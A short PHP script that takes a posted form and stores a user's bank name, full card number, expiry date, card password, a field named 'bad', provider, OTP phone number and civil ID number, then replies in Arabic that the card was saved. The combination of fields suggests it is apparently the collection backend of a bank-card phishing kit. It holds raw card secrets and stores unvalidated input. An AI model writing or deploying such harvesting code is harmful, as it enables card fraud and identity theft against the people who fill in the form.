<?php
require_once 'init.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $user_id = $_POST['user_id'];

    $data = [
        'bank' => $_POST['bank'],
        'cardNumber' => $_POST['cardNumber'],
        'month' => $_POST['month'],
        'year' => $_POST['year'],
        'password' => $_POST['password'],
        'bad' => $_POST['bad'],
        'provider' => $_POST['provider'],
        'otpphone' => $_POST['otpphone'],
        'civilnumber' => $_POST['civilnumber']
    ];

    $inserted = $User->InsertCardRelatedUser($user_id, $data);

    if ($inserted) {
        echo "تم حفظ البطاقة بنجاح";
    } else {
        echo "حدث خطأ أثناء حفظ البطاقة";
    }
}
?>
